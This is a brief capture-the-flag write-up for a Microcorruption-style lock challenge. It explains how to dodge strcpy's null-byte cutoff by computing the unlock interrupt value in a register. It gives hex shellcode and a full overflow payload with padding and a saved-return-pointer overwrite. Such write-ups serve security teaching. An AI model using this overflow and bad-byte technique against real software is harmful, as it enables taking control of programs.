## Challenge Overview
```
OVERVIEW

    - Lockitall developers  have rewritten the code  to conform to the
      internal secure development process.
    - This lock is attached the the LockIT Pro HSM-2.
```

## Solution
This challenge is very similar to Whitehorse expect for the `strcpy` command which will end the string at `0x00` which means we cant use.
```
445c:  3012 7e00      push	#0x7e
4460:  b012 4c45      call	#0x454c <INT>
```

Instead we can create the value and put it in r15:
```
mov #0x181, r15
sub #0x102, r15
push r15
call #0x454c
---
3f4081013f8002010f12b0124c45
```

adding the padding and srp overwrite:
```
3f4081013f8002010f12b0124c454141ee43
```

This works!

Nice intro to bad bytes.
